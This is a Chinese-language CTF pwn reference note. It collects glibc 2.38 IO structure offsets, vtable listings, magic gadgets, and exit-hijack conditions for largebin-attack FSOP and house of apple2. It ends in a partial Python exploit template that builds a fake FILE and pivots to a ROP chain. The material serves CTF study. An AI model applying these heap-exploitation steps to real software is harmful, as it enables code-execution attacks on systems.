---
date: 2024-10-27
tag:
  - pwn
  - io
---
# pwn IO相关偏移

> 主要是因为有几次比赛,题基本打到IO了但是就剩下十分钟了根本调不通IO链,为了预防这种情况再次出现这里慢慢总结一下IO相关结构体和不同的攻击方式
>
> 这里主要是快捷提供了一些结构体以及偏移方便直接查询,这里的偏移以**虚表**为主,**虚表实现**主要是辅助我们查找函数的

## gdb调试技巧

- 查看结构体的偏移量

  ```c
  ptype /o struct xxxx // 可以获取结构体的偏移量
  ```

  ![image-20241027104306803](https://awaqwqa.github.io/img/IO偏移/image-20241027104306803.png)

- 查看变量的类型

  ```shell
   ptype 变量 // 可以查看变量类型
  ```

  ![image-20241027104229082](https://awaqwqa.github.io/img/IO偏移/image-20241027104229082.png)

## largebin attack

> 主要是通过构造lagrebin attack 修改`_IO_list_all` 然后
>
> 因为修改后的目标地址存储的是我们unsortedbin 并入进入lagrebin的那个chunk,所以前0x30是没有办法劫持的

## magic_gadget

- 搜索mov 赋值相关gadget 可以查找 比如这里查找magic_gadget

  ```shell
  ROPgadget --binary ./libc.so.6 --only "mov|call" | grep "rdx" | grep "rax"
  ```

### svcudp_reply

> 可以让rdi的值赋值给rbp

#### glibc2.38

> 其实就是edi+0x48位置赋值给rbp 

```c
 0x7f20cbd5336e <svcudp_reply+20>:    mov    rbp,QWORD PTR [rdi+0x48]
 0x7f20cbd53372 <svcudp_reply+24>:    lea    r13,[rbp+0x10] 
 0x7f20cbd53376 <svcudp_reply+28>:    mov    DWORD PTR [rbp+0x10],0x0
 0x7f20cbd5337d <svcudp_reply+35>:    mov    rax,QWORD PTR [rbp+0x18]
 0x7f20cbd53381 <svcudp_reply+39>:    mov    esi,0x0
 0x7f20cbd53386 <svcudp_reply+44>:    mov    rdi,r13
 0x7f20cbd53389 <svcudp_reply+47>:    call   QWORD PTR [rax+0x28]
```

### setcontext

> rdi指向的地址赋值给各个寄存器 通常是setcontext + 53 

#### 通用

```c
setcontext_gadget = libc.sym["setcontext"] +libc_base + 53
```

### glibc2.27

```c
   0x00007f4af8b2a085 <+53>:    mov    rsp,QWORD PTR [rdi+0xa0]
   0x00007f4af8b2a08c <+60>:    mov    rbx,QWORD PTR [rdi+0x80]
   0x00007f4af8b2a093 <+67>:    mov    rbp,QWORD PTR [rdi+0x78]
   0x00007f4af8b2a097 <+71>:    mov    r12,QWORD PTR [rdi+0x48]
   0x00007f4af8b2a09b <+75>:    mov    r13,QWORD PTR [rdi+0x50]
   0x00007f4af8b2a09f <+79>:    mov    r14,QWORD PTR [rdi+0x58]
   0x00007f4af8b2a0a3 <+83>:    mov    r15,QWORD PTR [rdi+0x60]
   0x00007f4af8b2a0a7 <+87>:    mov    rcx,QWORD PTR [rdi+0xa8]
   0x00007f4af8b2a0ae <+94>:    push   rcx
   0x00007f4af8b2a0af <+95>:    mov    rsi,QWORD PTR [rdi+0x70]
   0x00007f4af8b2a0b3 <+99>:    mov    rdx,QWORD PTR [rdi+0x88]
   0x00007f4af8b2a0ba <+106>:   mov    rcx,QWORD PTR [rdi+0x98]
   0x00007f4af8b2a0c1 <+113>:   mov    r8,QWORD PTR [rdi+0x28]
   0x00007f4af8b2a0c5 <+117>:   mov    r9,QWORD PTR [rdi+0x30]
   0x00007f4af8b2a0c9 <+121>:   mov    rdi,QWORD PTR [rdi+0x68]
   0x00007f4af8b2a0cd <+125>:   xor    eax,eax
   0x00007f4af8b2a0cf <+127>:   ret

```

## hook

```python
malloc_hook  =  libc_base +libc.sym["__malloc_hook"]
free_hook =  libc_base + libc.sym["__free_hook"]
```

## 获取IO结构体偏移

```python
_IO_list_all = libc.sym["_IO_list_all"] +libc_base
_IO_2_1_stdin = libc.sym["_IO_2_1_stdin_"] +libc_base
_IO_2_1_stdout = libc.sym["_IO_2_1_stdout_"] +libc_base
_IO_2_1_stderr = libc.sym["_IO_2_1_stderr_"] +libc_base
_IO_wfile_jumps = libc.sym["_IO_wfile_jumps"] +libc_base
```

## 2.38

### 2.38-1ubuntu4_amd64

#### _IO_FILE_plus结构体

```c
struct _IO_FILE_plus
{
    // _IO_FILE
  FILE file; 
  const struct _IO_jump_t *vtable;
};
```

- 然后其属性和对应偏移

  ```c
  0-0xd8:file
  0xd8:vtable
  ```

- file结构体 偏移

  ```c
  /* offset    |  size */  type = struct _IO_FILE {
  /*    0      |     4 */    int _flags;
  /* XXX  4-byte hole  */
  /*    8      |     8 */    char *_IO_read_ptr;
  /*   16      |     8 */    char *_IO_read_end;
  /*   24      |     8 */    char *_IO_read_base;
  /*   32      |     8 */    char *_IO_write_base;
  /*   40      |     8 */    char *_IO_write_ptr;
  /*   48      |     8 */    char *_IO_write_end;
  /*   56      |     8 */    char *_IO_buf_base;
  /*   64      |     8 */    char *_IO_buf_end;
  /*   72      |     8 */    char *_IO_save_base;
  /*   80      |     8 */    char *_IO_backup_base;
  /*   88      |     8 */    char *_IO_save_end;
  /*   96      |     8 */    struct _IO_marker *_markers;
  /*  104      |     8 */    struct _IO_FILE *_chain;
  /*  112      |     4 */    int _fileno;
  /*  116      |     4 */    int _flags2;
  /*  120      |     8 */    __off_t _old_offset;
  /*  128      |     2 */    unsigned short _cur_column;
  /*  130      |     1 */    signed char _vtable_offset;
  /*  131      |     1 */    char _shortbuf[1];
  /* XXX  4-byte hole  */
  /*  136      |     8 */    _IO_lock_t *_lock;
  /*  144      |     8 */    __off64_t _offset;
  /*  152      |     8 */    struct _IO_codecvt *_codecvt;
  /*  160      |     8 */    struct _IO_wide_data *_wide_data;
  /*  168      |     8 */    struct _IO_FILE *_freeres_list;
  /*  176      |     8 */    void *_freeres_buf;
  /*  184      |     8 */    size_t __pad5;
  /*  192      |     4 */    int _mode;
  /*  196      |    20 */    char _unused2[20];
  
                             /* total size (bytes):  216 */
                           }
  
  ```

#### _IO_wide_data结构体

```c
/* offset    |  size */  type = struct _IO_wide_data {
/*    0      |     8 */    wchar_t *_IO_read_ptr;
/*    8      |     8 */    wchar_t *_IO_read_end;
/*   16      |     8 */    wchar_t *_IO_read_base;
/*   24      |     8 */    wchar_t *_IO_write_base;
/*   32      |     8 */    wchar_t *_IO_write_ptr;
/*   40      |     8 */    wchar_t *_IO_write_end;
/*   48      |     8 */    wchar_t *_IO_buf_base;
/*   56      |     8 */    wchar_t *_IO_buf_end;
/*   64      |     8 */    wchar_t *_IO_save_base;
/*   72      |     8 */    wchar_t *_IO_backup_base;
/*   80      |     8 */    wchar_t *_IO_save_end;
/*   88      |     8 */    __mbstate_t _IO_state;
/*   96      |     8 */    __mbstate_t _IO_last_state;
/*  104      |   112 */    struct _IO_codecvt {
/*  104      |    56 */        _IO_iconv_t __cd_in;
/*  160      |    56 */        _IO_iconv_t __cd_out;

                               /* total size (bytes):  112 */
                           } _codecvt;
/*  216      |     4 */    wchar_t _shortbuf[1];
/* XXX  4-byte hole  */
/*  224      |     8 */    const struct _IO_jump_t *_wide_vtable;

                           /* total size (bytes):  232 */
                         }

```

#### 虚表

- 虚表本质都是实现这个结构体,所以直接看这个结构体基本就行. 流程大概是先看代码调用了结构体vtable的哪个函数 然后通过这个函数找虚表实现看对应哪个结构体

```c
/* offset    |  size */  type = struct _IO_jump_t {
/*    0      |     8 */    size_t __dummy;
/*    8      |     8 */    size_t __dummy2;
/*   16      |     8 */    _IO_finish_t __finish;
/*   24      |     8 */    _IO_overflow_t __overflow;
/*   32      |     8 */    _IO_underflow_t __underflow;
/*   40      |     8 */    _IO_underflow_t __uflow;
/*   48      |     8 */    _IO_pbackfail_t __pbackfail;
/*   56      |     8 */    _IO_xsputn_t __xsputn;
/*   64      |     8 */    _IO_xsgetn_t __xsgetn;
/*   72      |     8 */    _IO_seekoff_t __seekoff;
/*   80      |     8 */    _IO_seekpos_t __seekpos;
/*   88      |     8 */    _IO_setbuf_t __setbuf;
/*   96      |     8 */    _IO_sync_t __sync;
/*  104      |     8 */    _IO_doallocate_t __doallocate;
/*  112      |     8 */    _IO_read_t __read;
/*  120      |     8 */    _IO_write_t __write;
/*  128      |     8 */    _IO_seek_t __seek;
/*  136      |     8 */    _IO_close_t __close;
/*  144      |     8 */    _IO_stat_t __stat;
/*  152      |     8 */    _IO_showmanyc_t __showmanyc;
/*  160      |     8 */    _IO_imbue_t __imbue;

                           /* total size (bytes):  168 */
                         }


```

#### 虚表实现

> 一般虚表的赋值都在libio/vtables.c文件里面 

```c
const struct _IO_jump_t __io_vtables[] attribute_relro =
{
  /* _IO_str_jumps  */
  [IO_STR_JUMPS] =
  {
    JUMP_INIT_DUMMY,
    JUMP_INIT (finish, _IO_str_finish),
    JUMP_INIT (overflow, _IO_str_overflow),
    JUMP_INIT (underflow, _IO_str_underflow),
    JUMP_INIT (uflow, _IO_default_uflow),
    JUMP_INIT (pbackfail, _IO_str_pbackfail),
    JUMP_INIT (xsputn, _IO_default_xsputn),
    JUMP_INIT (xsgetn, _IO_default_xsgetn),
    JUMP_INIT (seekoff, _IO_str_seekoff),
    JUMP_INIT (seekpos, _IO_default_seekpos),
    JUMP_INIT (setbuf, _IO_default_setbuf),
    JUMP_INIT (sync, _IO_default_sync),
    JUMP_INIT (doallocate, _IO_default_doallocate),
    JUMP_INIT (read, _IO_default_read),
    JUMP_INIT (write, _IO_default_write),
    JUMP_INIT (seek, _IO_default_seek),
    JUMP_INIT (close, _IO_default_close),
    JUMP_INIT (stat, _IO_default_stat),
    JUMP_INIT (showmanyc, _IO_default_showmanyc),
    JUMP_INIT (imbue, _IO_default_imbue)
  },
  /* _IO_wstr_jumps  */
  [IO_WSTR_JUMPS] = {
    JUMP_INIT_DUMMY,
    JUMP_INIT (finish, _IO_wstr_finish),
    JUMP_INIT (overflow, (_IO_overflow_t) _IO_wstr_overflow),
    JUMP_INIT (underflow, (_IO_underflow_t) _IO_wstr_underflow),
    JUMP_INIT (uflow, (_IO_underflow_t) _IO_wdefault_uflow),
    JUMP_INIT (pbackfail, (_IO_pbackfail_t) _IO_wstr_pbackfail),
    JUMP_INIT (xsputn, _IO_wdefault_xsputn),
    JUMP_INIT (xsgetn, _IO_wdefault_xsgetn),
    JUMP_INIT (seekoff, _IO_wstr_seekoff),
    JUMP_INIT (seekpos, _IO_default_seekpos),
    JUMP_INIT (setbuf, _IO_default_setbuf),
    JUMP_INIT (sync, _IO_default_sync),
    JUMP_INIT (doallocate, _IO_wdefault_doallocate),
    JUMP_INIT (read, _IO_default_read),
    JUMP_INIT (write, _IO_default_write),
    JUMP_INIT (seek, _IO_default_seek),
    JUMP_INIT (close, _IO_default_close),
    JUMP_INIT (stat, _IO_default_stat),
    JUMP_INIT (showmanyc, _IO_default_showmanyc),
    JUMP_INIT (imbue, _IO_default_imbue)
  },
  /* _IO_file_jumps  */
  [IO_FILE_JUMPS] = {
    JUMP_INIT_DUMMY,
    JUMP_INIT (finish, _IO_file_finish),
    JUMP_INIT (overflow, _IO_file_overflow),
    JUMP_INIT (underflow, _IO_file_underflow),
    JUMP_INIT (uflow, _IO_default_uflow),
    JUMP_INIT (pbackfail, _IO_default_pbackfail),
    JUMP_INIT (xsputn, _IO_file_xsputn),
    JUMP_INIT (xsgetn, _IO_file_xsgetn),
    JUMP_INIT (seekoff, _IO_new_file_seekoff),
    JUMP_INIT (seekpos, _IO_default_seekpos),
    JUMP_INIT (setbuf, _IO_new_file_setbuf),
    JUMP_INIT (sync, _IO_new_file_sync),
    JUMP_INIT (doallocate, _IO_file_doallocate),
    JUMP_INIT (read, _IO_file_read),
    JUMP_INIT (write, _IO_new_file_write),
    JUMP_INIT (seek, _IO_file_seek),
    JUMP_INIT (close, _IO_file_close),
    JUMP_INIT (stat, _IO_file_stat),
    JUMP_INIT (showmanyc, _IO_default_showmanyc),
    JUMP_INIT (imbue, _IO_default_imbue)
  },
  /* _IO_file_jumps_mmap  */
  [IO_FILE_JUMPS_MMAP] = {
    JUMP_INIT_DUMMY,
    JUMP_INIT (finish, _IO_file_finish),
    JUMP_INIT (overflow, _IO_file_overflow),
    JUMP_INIT (underflow, _IO_file_underflow_mmap),
    JUMP_INIT (uflow, _IO_default_uflow),
    JUMP_INIT (pbackfail, _IO_default_pbackfail),
    JUMP_INIT (xsputn, _IO_new_file_xsputn),
    JUMP_INIT (xsgetn, _IO_file_xsgetn_mmap),
    JUMP_INIT (seekoff, _IO_file_seekoff_mmap),
    JUMP_INIT (seekpos, _IO_default_seekpos),
    JUMP_INIT (setbuf, (_IO_setbuf_t) _IO_file_setbuf_mmap),
    JUMP_INIT (sync, _IO_file_sync_mmap),
    JUMP_INIT (doallocate, _IO_file_doallocate),
    JUMP_INIT (read, _IO_file_read),
    JUMP_INIT (write, _IO_new_file_write),
    JUMP_INIT (seek, _IO_file_seek),
    JUMP_INIT (close, _IO_file_close_mmap),
    JUMP_INIT (stat, _IO_file_stat),
    JUMP_INIT (showmanyc, _IO_default_showmanyc),
    JUMP_INIT (imbue, _IO_default_imbue)
  },
  /* _IO_file_jumps_maybe_mmap  */
  [IO_FILE_JUMPS_MAYBE_MMAP] = {
    JUMP_INIT_DUMMY,
    JUMP_INIT (finish, _IO_file_finish),
    JUMP_INIT (overflow, _IO_file_overflow),
    JUMP_INIT (underflow, _IO_file_underflow_maybe_mmap),
    JUMP_INIT (uflow, _IO_default_uflow),
    JUMP_INIT (pbackfail, _IO_default_pbackfail),
    JUMP_INIT (xsputn, _IO_new_file_xsputn),
    JUMP_INIT (xsgetn, _IO_file_xsgetn_maybe_mmap),
    JUMP_INIT (seekoff, _IO_file_seekoff_maybe_mmap),
    JUMP_INIT (seekpos, _IO_default_seekpos),
    JUMP_INIT (setbuf, (_IO_setbuf_t) _IO_file_setbuf_mmap),
    JUMP_INIT (sync, _IO_new_file_sync),
    JUMP_INIT (doallocate, _IO_file_doallocate),
    JUMP_INIT (read, _IO_file_read),
    JUMP_INIT (write, _IO_new_file_write),
    JUMP_INIT (seek, _IO_file_seek),
    JUMP_INIT (close, _IO_file_close),
    JUMP_INIT (stat, _IO_file_stat),
    JUMP_INIT (showmanyc, _IO_default_showmanyc),
    JUMP_INIT (imbue, _IO_default_imbue)
  },
  /* _IO_wfile_jumps  */
  [IO_WFILE_JUMPS] = {
    JUMP_INIT_DUMMY,
    JUMP_INIT (finish, _IO_new_file_finish),
    JUMP_INIT (overflow, (_IO_overflow_t) _IO_wfile_overflow),
    JUMP_INIT (underflow, (_IO_underflow_t) _IO_wfile_underflow),
    JUMP_INIT (uflow, (_IO_underflow_t) _IO_wdefault_uflow),
    JUMP_INIT (pbackfail, (_IO_pbackfail_t) _IO_wdefault_pbackfail),
    JUMP_INIT (xsputn, _IO_wfile_xsputn),
    JUMP_INIT (xsgetn, _IO_file_xsgetn),
    JUMP_INIT (seekoff, _IO_wfile_seekoff),
    JUMP_INIT (seekpos, _IO_default_seekpos),
    JUMP_INIT (setbuf, _IO_new_file_setbuf),
    JUMP_INIT (sync, (_IO_sync_t) _IO_wfile_sync),
    JUMP_INIT (doallocate, _IO_wfile_doallocate),
    JUMP_INIT (read, _IO_file_read),
    JUMP_INIT (write, _IO_new_file_write),
    JUMP_INIT (seek, _IO_file_seek),
    JUMP_INIT (close, _IO_file_close),
    JUMP_INIT (stat, _IO_file_stat),
    JUMP_INIT (showmanyc, _IO_default_showmanyc),
    JUMP_INIT (imbue, _IO_default_imbue)
  },
  /* _IO_wfile_jumps_mmap  */
  [IO_WFILE_JUMPS_MMAP] = {
    JUMP_INIT_DUMMY,
    JUMP_INIT (finish, _IO_new_file_finish),
    JUMP_INIT (overflow, (_IO_overflow_t) _IO_wfile_overflow),
    JUMP_INIT (underflow, (_IO_underflow_t) _IO_wfile_underflow_mmap),
    JUMP_INIT (uflow, (_IO_underflow_t) _IO_wdefault_uflow),
    JUMP_INIT (pbackfail, (_IO_pbackfail_t) _IO_wdefault_pbackfail),
    JUMP_INIT (xsputn, _IO_wfile_xsputn),
    JUMP_INIT (xsgetn, _IO_file_xsgetn),
    JUMP_INIT (seekoff, _IO_wfile_seekoff),
    JUMP_INIT (seekpos, _IO_default_seekpos),
    JUMP_INIT (setbuf, _IO_file_setbuf_mmap),
    JUMP_INIT (sync, (_IO_sync_t) _IO_wfile_sync),
    JUMP_INIT (doallocate, _IO_wfile_doallocate),
    JUMP_INIT (read, _IO_file_read),
    JUMP_INIT (write, _IO_new_file_write),
    JUMP_INIT (seek, _IO_file_seek),
    JUMP_INIT (close, _IO_file_close_mmap),
    JUMP_INIT (stat, _IO_file_stat),
    JUMP_INIT (showmanyc, _IO_default_showmanyc),
    JUMP_INIT (imbue, _IO_default_imbue)
  },
  /* _IO_wfile_jumps_maybe_mmap  */
  [IO_WFILE_JUMPS_MAYBE_MMAP] = {
    JUMP_INIT_DUMMY,
    JUMP_INIT (finish, _IO_new_file_finish),
    JUMP_INIT (overflow, (_IO_overflow_t) _IO_wfile_overflow),
    JUMP_INIT (underflow, (_IO_underflow_t) _IO_wfile_underflow_maybe_mmap),
    JUMP_INIT (uflow, (_IO_underflow_t) _IO_wdefault_uflow),
    JUMP_INIT (pbackfail, (_IO_pbackfail_t) _IO_wdefault_pbackfail),
    JUMP_INIT (xsputn, _IO_wfile_xsputn),
    JUMP_INIT (xsgetn, _IO_file_xsgetn),
    JUMP_INIT (seekoff, _IO_wfile_seekoff),
    JUMP_INIT (seekpos, _IO_default_seekpos),
    JUMP_INIT (setbuf, _IO_file_setbuf_mmap),
    JUMP_INIT (sync, (_IO_sync_t) _IO_wfile_sync),
    JUMP_INIT (doallocate, _IO_wfile_doallocate),
    JUMP_INIT (read, _IO_file_read),
    JUMP_INIT (write, _IO_new_file_write),
    JUMP_INIT (seek, _IO_file_seek),
    JUMP_INIT (close, _IO_file_close),
    JUMP_INIT (stat, _IO_file_stat),
    JUMP_INIT (showmanyc, _IO_default_showmanyc),
    JUMP_INIT (imbue, _IO_default_imbue)
  },
  /* _IO_cookie_jumps  */
  [IO_COOKIE_JUMPS] = {
    JUMP_INIT_DUMMY,
    JUMP_INIT (finish, _IO_file_finish),
    JUMP_INIT (overflow, _IO_file_overflow),
    JUMP_INIT (underflow, _IO_file_underflow),
    JUMP_INIT (uflow, _IO_default_uflow),
    JUMP_INIT (pbackfail, _IO_default_pbackfail),
    JUMP_INIT (xsputn, _IO_file_xsputn),
    JUMP_INIT (xsgetn, _IO_default_xsgetn),
    JUMP_INIT (seekoff, _IO_cookie_seekoff),
    JUMP_INIT (seekpos, _IO_default_seekpos),
    JUMP_INIT (setbuf, _IO_file_setbuf),
    JUMP_INIT (sync, _IO_file_sync),
    JUMP_INIT (doallocate, _IO_file_doallocate),
    JUMP_INIT (read, _IO_cookie_read),
    JUMP_INIT (write, _IO_cookie_write),
    JUMP_INIT (seek, _IO_cookie_seek),
    JUMP_INIT (close, _IO_cookie_close),
    JUMP_INIT (stat, _IO_default_stat),
    JUMP_INIT (showmanyc, _IO_default_showmanyc),
    JUMP_INIT (imbue, _IO_default_imbue),
  },
  /* _IO_proc_jumps  */
  [IO_PROC_JUMPS] = {
    JUMP_INIT_DUMMY,
    JUMP_INIT (finish, _IO_new_file_finish),
    JUMP_INIT (overflow, _IO_new_file_overflow),
    JUMP_INIT (underflow, _IO_new_file_underflow),
    JUMP_INIT (uflow, _IO_default_uflow),
    JUMP_INIT (pbackfail, _IO_default_pbackfail),
    JUMP_INIT (xsputn, _IO_new_file_xsputn),
    JUMP_INIT (xsgetn, _IO_default_xsgetn),
    JUMP_INIT (seekoff, _IO_new_file_seekoff),
    JUMP_INIT (seekpos, _IO_default_seekpos),
    JUMP_INIT (setbuf, _IO_new_file_setbuf),
    JUMP_INIT (sync, _IO_new_file_sync),
    JUMP_INIT (doallocate, _IO_file_doallocate),
    JUMP_INIT (read, _IO_file_read),
    JUMP_INIT (write, _IO_new_file_write),
    JUMP_INIT (seek, _IO_file_seek),
    JUMP_INIT (close, _IO_new_proc_close),
    JUMP_INIT (stat, _IO_file_stat),
    JUMP_INIT (showmanyc, _IO_default_showmanyc),
    JUMP_INIT (imbue, _IO_default_imbue)
  },
  /* _IO_mem_jumps  */
  [IO_MEM_JUMPS] = {
    JUMP_INIT_DUMMY,
    JUMP_INIT (finish, _IO_mem_finish),
    JUMP_INIT (overflow, _IO_str_overflow),
    JUMP_INIT (underflow, _IO_str_underflow),
    JUMP_INIT (uflow, _IO_default_uflow),
    JUMP_INIT (pbackfail, _IO_str_pbackfail),
    JUMP_INIT (xsputn, _IO_default_xsputn),
    JUMP_INIT (xsgetn, _IO_default_xsgetn),
    JUMP_INIT (seekoff, _IO_str_seekoff),
    JUMP_INIT (seekpos, _IO_default_seekpos),
    JUMP_INIT (setbuf, _IO_default_setbuf),
    JUMP_INIT (sync, _IO_mem_sync),
    JUMP_INIT (doallocate, _IO_default_doallocate),
    JUMP_INIT (read, _IO_default_read),
    JUMP_INIT (write, _IO_default_write),
    JUMP_INIT (seek, _IO_default_seek),
    JUMP_INIT (close, _IO_default_close),
    JUMP_INIT (stat, _IO_default_stat),
    JUMP_INIT (showmanyc, _IO_default_showmanyc),
    JUMP_INIT (imbue, _IO_default_imbue)
  },
  /* _IO_wmem_jumps  */
  [IO_WMEM_JUMPS] = {
    JUMP_INIT_DUMMY,
    JUMP_INIT (finish, _IO_wmem_finish),
    JUMP_INIT (overflow, (_IO_overflow_t) _IO_wstr_overflow),
    JUMP_INIT (underflow, (_IO_underflow_t) _IO_wstr_underflow),
    JUMP_INIT (uflow, (_IO_underflow_t) _IO_wdefault_uflow),
    JUMP_INIT (pbackfail, (_IO_pbackfail_t) _IO_wstr_pbackfail),
    JUMP_INIT (xsputn, _IO_wdefault_xsputn),
    JUMP_INIT (xsgetn, _IO_wdefault_xsgetn),
    JUMP_INIT (seekoff, _IO_wstr_seekoff),
    JUMP_INIT (seekpos, _IO_default_seekpos),
    JUMP_INIT (setbuf, _IO_default_setbuf),
    JUMP_INIT (sync, _IO_wmem_sync),
    JUMP_INIT (doallocate, _IO_wdefault_doallocate),
    JUMP_INIT (read, _IO_default_read),
    JUMP_INIT (write, _IO_default_write),
    JUMP_INIT (seek, _IO_default_seek),
    JUMP_INIT (close, _IO_default_close),
    JUMP_INIT (stat, _IO_default_stat),
    JUMP_INIT (showmanyc, _IO_default_showmanyc),
    JUMP_INIT (imbue, _IO_default_imbue)
  },
  [IO_PRINTF_BUFFER_AS_FILE_JUMPS] = {
    JUMP_INIT_DUMMY,
    JUMP_INIT (finish, NULL),
    JUMP_INIT (overflow, __printf_buffer_as_file_overflow),
    JUMP_INIT (underflow, NULL),
    JUMP_INIT (uflow, NULL),
    JUMP_INIT (pbackfail, NULL),
    JUMP_INIT (xsputn, __printf_buffer_as_file_xsputn),
    JUMP_INIT (xsgetn, NULL),
    JUMP_INIT (seekoff, NULL),
    JUMP_INIT (seekpos, NULL),
    JUMP_INIT (setbuf, NULL),
    JUMP_INIT (sync, NULL),
    JUMP_INIT (doallocate, NULL),
    JUMP_INIT (read, NULL),
    JUMP_INIT (write, NULL),
    JUMP_INIT (seek, NULL),
    JUMP_INIT (close, NULL),
    JUMP_INIT (stat, NULL),
    JUMP_INIT (showmanyc, NULL),
    JUMP_INIT (imbue, NULL)
  },
  [IO_WPRINTF_BUFFER_AS_FILE_JUMPS] = {
    JUMP_INIT_DUMMY,
    JUMP_INIT (finish, NULL),
    JUMP_INIT (overflow, (_IO_overflow_t) __wprintf_buffer_as_file_overflow),
    JUMP_INIT (underflow, NULL),
    JUMP_INIT (uflow, NULL),
    JUMP_INIT (pbackfail, NULL),
    JUMP_INIT (xsputn, __wprintf_buffer_as_file_xsputn),
    JUMP_INIT (xsgetn, NULL),
    JUMP_INIT (seekoff, NULL),
    JUMP_INIT (seekpos, NULL),
    JUMP_INIT (setbuf, NULL),
    JUMP_INIT (sync, NULL),
    JUMP_INIT (doallocate, NULL),
    JUMP_INIT (read, NULL),
    JUMP_INIT (write, NULL),
    JUMP_INIT (seek, NULL),
    JUMP_INIT (close, NULL),
    JUMP_INIT (stat, NULL),
    JUMP_INIT (showmanyc, NULL),
    JUMP_INIT (imbue, NULL)
  },

#if SHLIB_COMPAT (libc, GLIBC_2_0, GLIBC_2_1)
  /* _IO_old_file_jumps  */
  [IO_OLD_FILE_JUMPS] = {
    JUMP_INIT_DUMMY,
    JUMP_INIT (finish, _IO_old_file_finish),
    JUMP_INIT (overflow, _IO_old_file_overflow),
    JUMP_INIT (underflow, _IO_old_file_underflow),
    JUMP_INIT (uflow, _IO_default_uflow),
    JUMP_INIT (pbackfail, _IO_default_pbackfail),
    JUMP_INIT (xsputn, _IO_old_file_xsputn),
    JUMP_INIT (xsgetn, _IO_default_xsgetn),
    JUMP_INIT (seekoff, _IO_old_file_seekoff),
    JUMP_INIT (seekpos, _IO_default_seekpos),
    JUMP_INIT (setbuf, _IO_old_file_setbuf),
    JUMP_INIT (sync, _IO_old_file_sync),
    JUMP_INIT (doallocate, _IO_file_doallocate),
    JUMP_INIT (read, _IO_file_read),
    JUMP_INIT (write, _IO_old_file_write),
    JUMP_INIT (seek, _IO_file_seek),
    JUMP_INIT (close, _IO_file_close),
    JUMP_INIT (stat, _IO_file_stat)
  },
  /*  _IO_old_proc_jumps  */
  [IO_OLD_PROC_JUMPS] = {
    JUMP_INIT_DUMMY,
    JUMP_INIT (finish, _IO_old_file_finish),
    JUMP_INIT (overflow, _IO_old_file_overflow),
    JUMP_INIT (underflow, _IO_old_file_underflow),
    JUMP_INIT (uflow, _IO_default_uflow),
    JUMP_INIT (pbackfail, _IO_default_pbackfail),
    JUMP_INIT (xsputn, _IO_old_file_xsputn),
    JUMP_INIT (xsgetn, _IO_default_xsgetn),
    JUMP_INIT (seekoff, _IO_old_file_seekoff),
    JUMP_INIT (seekpos, _IO_default_seekpos),
    JUMP_INIT (setbuf, _IO_old_file_setbuf),
    JUMP_INIT (sync, _IO_old_file_sync),
    JUMP_INIT (doallocate, _IO_file_doallocate),
    JUMP_INIT (read, _IO_file_read),
    JUMP_INIT (write, _IO_old_file_write),
    JUMP_INIT (seek, _IO_file_seek),
    JUMP_INIT (close, _IO_old_proc_close),
    JUMP_INIT (stat, _IO_file_stat),
    JUMP_INIT (showmanyc, _IO_default_showmanyc),
    JUMP_INIT (imbue, _IO_default_imbue)
  },
#endif

#if SHLIB_COMPAT (libc, GLIBC_2_0, GLIBC_2_2)
  /* _IO_old_cookie_jumps  */
  [IO_OLD_COOKIED_JUMPS] = {
    JUMP_INIT_DUMMY,
    JUMP_INIT (finish, _IO_file_finish),
    JUMP_INIT (overflow, _IO_file_overflow),
    JUMP_INIT (underflow, _IO_file_underflow),
    JUMP_INIT (uflow, _IO_default_uflow),
    JUMP_INIT (pbackfail, _IO_default_pbackfail),
    JUMP_INIT (xsputn, _IO_file_xsputn),
    JUMP_INIT (xsgetn, _IO_default_xsgetn),
    JUMP_INIT (seekoff, _IO_cookie_seekoff),
    JUMP_INIT (seekpos, _IO_default_seekpos),
    JUMP_INIT (setbuf, _IO_file_setbuf),
    JUMP_INIT (sync, _IO_file_sync),
    JUMP_INIT (doallocate, _IO_file_doallocate),
    JUMP_INIT (read, _IO_cookie_read),
    JUMP_INIT (write, _IO_cookie_write),
    JUMP_INIT (seek, _IO_old_cookie_seek),
    JUMP_INIT (close, _IO_cookie_close),
    JUMP_INIT (stat, _IO_default_stat),
    JUMP_INIT (showmanyc, _IO_default_showmanyc),
    JUMP_INIT (imbue, _IO_default_imbue),
  },
#endif
};
_Static_assert (array_length (__io_vtables) == IO_VTABLES_NUM,
                "initializer count");
```

#### 劫持exit lagrebin attack

exit触发的函数调用链是_IO_cleanup-> _IO_flush_all->_IO_OVERFLOW (偏移0x18)然后就会获取`_IO_list_all`然后开始循环

满足条件

- fp->_mode <= 0  也就是0xc0小于等于0
- fp->_IO_write_ptr > fp->_IO_write_base 也就是0x20 小于 0x28 (lagrebin attack自动满足这个条件)
- vatble 有值
- _lock要是一个可写地址(可写就行)

##### house of apple2

house of apple2的话我们要触发以下调用链 因为都是触发**overflow**函数所以不需要调整偏移

- `_IO_wfile_overflow` () (overflow函数对应偏移 0x18)
- `_IO_wdoallocbuf `  (非虚表)
- `_IO_WDOALLOCATE` 也就是对应`doallocate`函数  (对应偏移0x68 f->_wide_vtable->__doallocate)

那么满足条件

- _flags & _IO_NO_WRITES == 0  (lagrebin attack自动满足)因为0&任意数任然为0
- (f->_flags & _IO_CURRENTLY_PUTTING) == 0 也是自动满足
- f->_wide_data->_IO_write_base == 0 也就是0xa0指向的地方的0x20偏移位置为0

**板子**

> 由于高版本执行到call的时候 rbp变成了0xffffffff,所以我们无法使用通用的板子.我们要是还是想要实现gadget 
>
> 我们可以使用magic gadget svcudp_reply+20位置的代码 此时我们_stdout就是rdi寄存器
>
> - 其实就是edi+0x48位置赋值给rbp 

```python
# fake wide
fake_IO_addr = heap_base+0x290
# 刚好让
magic_gadget = 1250158 +libc_base
leavn_retn =  0x477e7  +libc_base
pop_rsp = 0x2879c  +libc_base
print("pop_rsp:",hex(pop_rsp))
# 执行ROP链的chunk地址
ROP_addr = heap_base+0x100
magic_addrs = {
    # mov rbp,QWORD PTR [rdi+0x48]
    "rbp": fake_IO_addr+0x40,
    "rdi":fake_IO_addr +0x40,
    "rax":fake_IO_addr +128,
    "rbp_value" : ROP_addr,
    "call":pop_rsp
}
wfile_addrs = {
    # 指向地址+0x20 要为0
    "_wide_data":fake_IO_addr-0x48,
    # wide 虚表 要求0x68位置为执行函数
    "_wide_vtable":fake_IO_addr,
    # 首次执行函数地址 应该在结构体偏移0x68位置
    "first_cmd":magic_gadget,
}
fsop_exit_addrs = {
# 需要为0
    "_mode":0,
    # ptr大于base就行
    "_IO_write_ptr":1,
    "_IO_write_base":0,
    # 随意一个可写地址就可以 会在上面写0
    "_lock":fake_IO_addr,
    "_IO_read_base":0,
